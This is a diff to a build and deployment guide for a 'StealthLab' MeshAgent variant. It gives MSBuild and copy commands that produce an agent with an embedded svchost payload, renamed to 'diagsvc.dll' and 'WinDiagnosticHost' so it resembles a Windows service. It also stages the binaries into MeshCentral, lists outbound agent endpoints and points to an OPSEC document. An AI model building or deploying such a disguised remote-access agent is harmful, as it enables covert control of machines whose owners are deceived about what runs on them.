@@ -10,13 +10,14 @@ This guide describes the current, fully automated workflow for producing Stealth
 
 The local build pipeline now handles every step end-to-end:
 
-- `build.ps1` (StealthLab profile enabled by default) generates branding headers, builds the StealthLab DLL, and *automatically stages* `meshservice\embedded\svchost_payload.dll` with the latest payload.
-- The same invocation emits StealthLab binaries to:
+- `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal` generates branding headers and provisioning assets, builds the StealthLab DLL, refreshes `meshservice\embedded\svchost_payload.dll`, and then builds the StealthLab outputs.
+- The same build emits:
   - `meshservice\x64\StealthLab\MeshService-2022.exe`
   - `meshservice\StealthLab\MeshService-2022.exe`
+- `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`
+- `meshconsole\Release\MeshConsole64.exe`
 - StealthLab defaults are enforced; when you must exercise a non-StealthLab build (for example, a legacy Release regression), invoke MSBuild directly using the commands in *Manual Release Regression* below.
-- Packaging scripts (`build_complete.ps1`, `build_all.ps1`) rename artifacts to the production-friendly `diagsvc.dll` and create a ready-to-ship drop folder.
-- `tools\prepare_meshcentral_agent.ps1` runs the StealthLab build, verifies the embedded svchost payload, and stages `MeshService64.exe`, `diagsvc.dll`, provisioning files, and hashes under `dist\meshcentral`.
+- Packaging and MeshCentral staging are now explicit copy/sign steps driven from those build outputs rather than PowerShell build wrappers.
 
 GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.
 
@@ -33,11 +34,11 @@ GitHub Actions remains available for automation, but the on-device workflow is t
 - Python 3.10+ on the PATH (used by helper scripts).
 - Git submodules initialised:  `git submodule update --init --recursive`
 - `branding_config.local.json` populated with your production values (see the updated template later in this document). The tracked `branding_config.json` now contains only placeholders.
-- Validate branding before building:
+- Optional preflight before building:
   ```powershell
-  pwsh ./tools/validate_branding_config.ps1
+  python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json
   ```
-  The build scripts call this automatically, but running it up front catches schema and hex-length mistakes early.
+  This validates the branding JSON while regenerating `meshcore\generated\meshagent_branding.h` and `WinDiagnosticHost.msh`. The MSBuild path also performs this generation automatically.
 
 ---
 
@@ -51,21 +52,26 @@ GitHub Actions remains available for automation, but the on-device workflow is t
    ```powershell
    git pull
    ```
-3. Launch the StealthLab build (StealthLab profile and svchost payload restaging are enabled by default):
+3. Launch the StealthLab build:
    ```powershell
-   .\build.ps1
+   MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
    ```
-   The script will:
-   - Revalidate your branding configuration (preferring `branding_config.local.json`) and regenerate `meshagent_branding.h`/`WinDiagnosticHost.msh`.
+   The build will:
+   - Regenerate `meshagent_branding.h`, `WinDiagnosticHost.msh`, and the generated network profile from `branding_config.local.json` (preferred) or `branding_config.json`.
    - Rebuild `MeshService-2022.dll` under `meshservice\x64\StealthLab_DLL`.
    - Copy that DLL into `meshservice\embedded\svchost_payload.dll` (no manual staging required).
-   - Emit StealthLab executables for x64 and Win32 and print their sizes plus MD5 hashes.
+   - Emit StealthLab executables for x64 and Win32 plus the x64 MeshConsole build.
 4. Run the fast regression harness to confirm branding, payload, and resource checks:
    ```powershell
    pwsh .\test.ps1 -ReportPath .\dist\verify-report.json
    ```
    Expect warnings for unsigned binaries until you apply Authenticode signatures. Any failures must be resolved before packaging.
-5. (Optional) Build additional StealthLab variants by passing `-Configuration <Name>` (e.g. `StealthLab_DLL`, `Debug`). StealthLab enforcement remains in place regardless of switches; to exercise plain Release binaries, follow the *Manual Release Regression* workflow.
+5. (Optional) Build individual variants directly when you only need one output:
+   ```powershell
+   MSBuild.exe .\meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m /nologo
+   MSBuild.exe .\MeshAgent-2022.sln /p:Configuration=StealthLab /p:Platform=x64 /m /nologo
+   MSBuild.exe .\meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=Win32 /m /nologo
+   ```
 
 Verify the payload was staged correctly:
 ```powershell
@@ -81,20 +87,27 @@ Get-FileHash meshservice\embedded\svchost_payload.dll
 ### 1. Generate a Drop-In Package (Recommended)
 
 ```powershell
-.\build_complete.ps1 [-RunHealthCheck] [-SkipArchive]
+$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+$bundle = Join-Path 'dist' "MeshAgent_Stealth_$stamp"
+New-Item -ItemType Directory -Path $bundle, (Join-Path $bundle 'verification') -Force | Out-Null
+Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService64.exe') -Force
+Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService.exe') -Force
+Copy-Item 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' (Join-Path $bundle 'diagsvc.dll') -Force
+Copy-Item 'WinDiagnosticHost.msh' (Join-Path $bundle 'WinDiagnosticHost.msh') -Force
+pwsh .\test.ps1 -ReportPath (Join-Path $bundle 'verification\verify-report.json')
 ```
 
-`build_complete.ps1` orchestrates a StealthLab build, runs `test.ps1`, produces a timestamped bundle under `dist\\MeshAgent_Stealth_<stamp>\\`, and (optionally) executes the health probe.
+This produces a timestamped bundle under `dist\\MeshAgent_Stealth_<stamp>\\` using the already-built StealthLab outputs. Add `pwsh .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath <bundle>\verification\health_report.json` when you need a post-install health probe.
 
 Each bundle contains:
 
 - `diagsvc.dll` – svchost payload ready for deployment.
 - `MeshService64.exe` / `MeshService.exe` – binaries for direct service overrides.
 - `verification\\` – regression output (`verify-log.txt`, `verify-report.json`) plus `health_report.json` when `-RunHealthCheck` is supplied.
-- `MeshAgent_Stealth_*\\.sha256` and `*-manifest.json` – digests and signer metadata (also copied to `dist\\`).
-- `checksums.txt`, `install.ps1`, and `README.txt` – operator hand-off material.
+- `checksums.txt` / release notes you generate from the copied files.
+- `README.txt` or deployment instructions for the target environment.
 
-> **Health check tip:** the probe can only verify the installed service when it knows the install path. Provide it via `-HealthCheckArgs @{ InstallPath = 'C:\\ProgramData\\DiagnosticHost' }` if you need a fully green report; otherwise it will finish with one warning and one failure indicating the binary was not located.
+> **Health check tip:** the probe can only verify the installed service when it knows the install path. Point `tools\health_check.ps1` at `C:\ProgramData\DiagnosticHost` (or your deployment path) when you need a fully green report.
 
 ### Package Verification
 
@@ -110,7 +123,7 @@ pwsh .\test_comprehensive.ps1
 
 ### 2. Manual Artifact Pickup
 
-If you need individual files:
+If you need individual files without creating a bundle:
 
 | Artifact | Location |
 |----------|----------|
@@ -138,21 +151,25 @@ This produces `Release\MeshService64.exe` plus `meshservice\Release\MeshService.
 
 ### 4. MeshCentral override bundle
 
-To stage files exactly as MeshCentral expects (including the executable override), run:
+To stage files exactly as MeshCentral expects:
 
 ```powershell
-.\tools\prepare_meshcentral_agent.ps1
+$handoff = 'dist\meshcentral'
+$agents = Join-Path $handoff 'meshcentral-data\agents'
+$signed = Join-Path $handoff 'meshcentral-data\signedagents'
+New-Item -ItemType Directory -Path $agents, $signed -Force | Out-Null
+Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $agents 'MeshService64.exe') -Force
+Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $agents 'MeshService.exe') -Force
+Copy-Item 'WinDiagnosticHost.msh' (Join-Path $agents 'WinDiagnosticHost.msh') -Force
+Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $signed 'MeshService64.exe') -Force
+Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $signed 'MeshService.exe') -Force
+Copy-Item 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' (Join-Path $handoff 'diagsvc.dll') -Force
 ```
 
-This produces `dist\meshcentral\` with:
-
-- `MeshService64.exe` (and optionally `MeshService.exe`) – svchost-enabled executables ready to copy into `meshcentral-data\agents\`.
-- `diagsvc.dll`, provisioning `.msh`, branding JSON, and `checksums.txt` for integrity validation.
-- A README summarising deployment steps and hashes.
+This produces `dist\meshcentral\` with the agent-serving binaries under `meshcentral-data\agents\`, optional pre-signed slots under `meshcentral-data\signedagents\`, and `diagsvc.dll` for svchost deployments.
 
 ### 5. Transfer Package Generation
-Run the helper snippet below whenever you need to hand off a ZIP with metadata and hashes (for GitHub releases or offline transfer):
-Equivalent helper script: `pwsh .\tools\create_release_package.ps1`
+Run the snippet below whenever you need to hand off a ZIP with metadata and hashes (for GitHub releases or offline transfer):
 
 ```powershell
 $date = Get-Date -Format 'yyyy-MM-dd'
@@ -199,13 +216,13 @@ Deliverable contents:
 
 ## Deploy to MeshCentral
 
-1. **Stage locally with the helper.** When the MeshCentral data folder sits beside the MeshAgent repo (default dev rig), run:
+1. **Stage locally.** When the MeshCentral data folder sits beside the MeshAgent repo (default dev rig), run:
    ```powershell
-   pwsh .\tools\stage_meshcentral_agents.ps1 `
-        -MeshCentralDataPath '..\meshcentral-data' `
-        -IncludeWin32
+   Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' '..\meshcentral-data\agents\MeshService64.exe' -Force
+   Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' '..\meshcentral-data\agents\MeshService.exe' -Force
+   Copy-Item 'WinDiagnosticHost.msh' '..\meshcentral-data\agents\WinDiagnosticHost.msh' -Force
    ```
-   The script copies `MeshService64.exe`, `MeshService.exe`, and `WinDiagnosticHost.msh` into `meshcentral-data\agents\` and mirrors the executables into `meshcentral-data\signedagents\`, printing the new SHA256 values.
+   If you are serving pre-signed binaries, mirror the same executables into `..\meshcentral-data\signedagents\`.
 2. **Stage remotely when needed.** Copy the same files to `/opt/meshcentral/meshcentral-data/agents/` on the target server:
    ```powershell
    scp meshservice\x64\StealthLab\MeshService-2022.exe deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService64.exe
@@ -248,13 +265,13 @@ Deliverable contents:
 
 ## Optional: GitHub Actions Automation
 
-The workflow in `.github/workflows/build-release.yml` still functions, but it now relies on the same PowerShell build scripts documented above. When enabling the workflow:
+The workflow in `.github/workflows/build-release.yml` still functions, and it now relies on the same generated-assets step plus direct `MSBuild` invocations documented above. When enabling the workflow:
 
 - Provide `SSH_PRIVATE_KEY` if you want the pipeline to deploy automatically (same key used for manual `scp`).
 - Update `BRANDING_CONFIG_JSON` to match the refreshed schema (see next section).
 - Expect the artifacts to be named `MeshService-2022.exe` instead of the legacy `MeshService64.exe`.
 
-Manual approvals are no longer needed to stage the DLL—the workflow inherits the `Stage-SvchostPayload` helper, so GitHub builds and local builds stay in sync.
+The GitHub workflow and local builds both regenerate branding assets before compiling, so the staged DLL and provisioning manifest stay in sync without wrapper scripts.
 
 ### MinGW Build Notes
 For cross-compiling with MinGW-w64 (e.g., on MSYS2):
@@ -270,7 +287,7 @@ For cross-compiling with MinGW-w64 (e.g., on MSYS2):
   | Warning | Action |
   |---------|--------|
   | `strings` not available | Install GNU binutils within MSYS2 (`pacman -S binutils`). |
-| Mesh/Server ID missing in log | Re-run `pwsh ./tools/embed_provisioning_simple.ps1` before building; confirm `branding_config.local.json` values. |
+| Mesh/Server ID missing in log | Re-run `python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json` before building; confirm `branding_config.local.json` values. |
   | `osslsigncode verify` failure | Sign the binaries (or disable the check) prior to distribution; local unsigned builds may skip this step. |
 
 ---
@@ -279,11 +296,11 @@ For cross-compiling with MinGW-w64 (e.g., on MSYS2):
 
 | Symptom | Checks |
 |---------|--------|
-| `svchost_payload.dll` not updated | Re-run `.\\build.ps1`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
+| `svchost_payload.dll` not updated | Re-run `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
 | MeshCentral still serving old agent | Confirm upload path, restart MeshCentral, and clear CDN/cache if fronted by a proxy. |
 | Agent fails to enrol | Ensure `branding_config.local.json` `provisioning.serverUrl` matches the domain you uploaded to, and that the server certificate hash is current. |
 | Build script exits early | Check that Visual Studio 2022 MSBuild is installed and available at `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`. |
-| Health check reports missing binaries | Re-run `build_complete.ps1 -RunHealthCheck` with `-HealthCheckArgs @{ InstallPath = ''C:\\ProgramData\\DiagnosticHost'' }` (or your deployment path). |
+| Health check reports missing binaries | Re-run `pwsh .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath .\dist\post-deploy-health.json` after installing to `C:\ProgramData\DiagnosticHost` (or your deployment path). |
 
 ---
 
@@ -345,7 +362,7 @@ MeshAgent now supports both fully static and MeshCentral-assigned (dynamic) cont
 
 **Port reference:** Make sure outbound TCP is permitted to every host/port pair you advertise. The default StealthLab profile uses `agents.high.support:4445`, `agents.high.support:4446`, `agents-dr.high.support:4445`, and `198.51.100.45:443`. Update the allowlist whenever you change the branding JSON so runtime validation does not fail on blocked egress.
 
-> **MeshCentral staging tip:** Whenever you enable `network.dynamic`, regenerate provisioning assets (`pwsh .\\tools\\embed_provisioning.ps1`) so the compiled header carries `NULL` endpoints and MeshCentral can supply the active URL via `WinDiagnosticHost.msh`.
+> **MeshCentral staging tip:** Whenever you enable `network.dynamic`, regenerate provisioning assets with `python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json` (or by rebuilding through `MeshAgent.Build.proj`) so the compiled header carries `NULL` endpoints and MeshCentral can supply the active URL via `WinDiagnosticHost.msh`.
 
 Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.
 
@@ -360,7 +377,7 @@ Keep the JSON committed without secrets; override sensitive values via environme
 | Win32 service wrapper | `meshservice\StealthLab\MeshService-2022.exe` | `D04A088EA0AF73D8B4DBB7DE917C37C80E4D4F8BDB20137BFA44394C9E630B7E` | Staged to `meshcentral-data\agents\MeshService.exe` |
 | Provisioning manifest | `meshservice\x64\StealthLab\MeshService-2022.msh` | `4ACEB797EEC7AD1772786B8EC1B87F327BD25DAEE60A4E666ABBF614345F4812` | Dynamic endpoints—MeshCentral overrides at download |
 
-These files were staged with `pwsh .\tools\stage_meshcentral_agents.ps1 -MeshCentralDataPath '..\MeshCentral\meshcentral-data' -IncludeWin32 -SkipBuild`. Restart MeshCentral (or let it auto-reload) so portal downloads serve the refreshed binaries.
+These files were staged by copying the current StealthLab outputs into `..\MeshCentral\meshcentral-data\agents\` (and optionally `..\MeshCentral\meshcentral-data\signedagents\` for pre-signed executables). Restart MeshCentral (or let it auto-reload) so portal downloads serve the refreshed binaries.
 
 Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.
 
